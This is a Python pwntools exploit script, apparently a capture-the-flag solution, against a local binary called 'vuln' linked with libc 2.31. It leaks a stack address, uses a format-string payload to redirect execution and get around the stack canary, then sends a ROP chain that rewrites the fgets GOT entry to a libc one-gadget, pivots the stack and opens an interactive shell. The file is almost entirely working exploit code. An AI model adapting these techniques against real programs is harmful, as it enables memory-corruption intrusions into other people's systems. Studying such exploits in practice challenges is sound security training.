from pwn import *

context.binary = elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")
conn = elf.process()

conn.recvuntil(b"0x")
stack = int(conn.recv(12), 16)
info("stack @ " + hex(stack))
conn.recvuntil(b": ")

main = elf.sym.vuln+0x39
payload = b""
payload += f"%10${256+8+1}c%14$s%10$c%10$c%11$c%12$c%13$c".ljust(48, "\0").encode() # 5-10, 10 is null
payload += bytes([p64(main)[0]]) + b"aaaaaaa" # 11
payload += bytes([p64(main)[1]]) + b"aaaaaaa" # 12
payload += bytes([p64(main)[2]]) + b"aaaaaaa" # 13
payload += p64(stack+256+8+1) # canary, 14
conn.sendline(payload)

rop = ROP(elf)
payload = b"a"*128
# rop chain, 8 words (48 bytes)
pop = 0x40136a # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
add = 0x4011dc # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(pop)
payload += p64(0xe3afe-libc.sym.fgets) # rbx
payload += p64(elf.got.fgets+0x3d) # rbp
payload += p64(0) # r12
payload += p64(0) # r13
payload += p64(stack + 0x90 - 0x8) # r14, rbp for initial stack pivot
payload += p64(0) # r15
payload += p64(add)
payload += p64(elf.sym.fgets) # trigger one gadget
payload = payload.ljust(216, b"a")
payload += p64(rop.find_gadget(["leave", "ret"])[0]) # initial stack pivot
conn.sendline(payload)

conn.interactive()
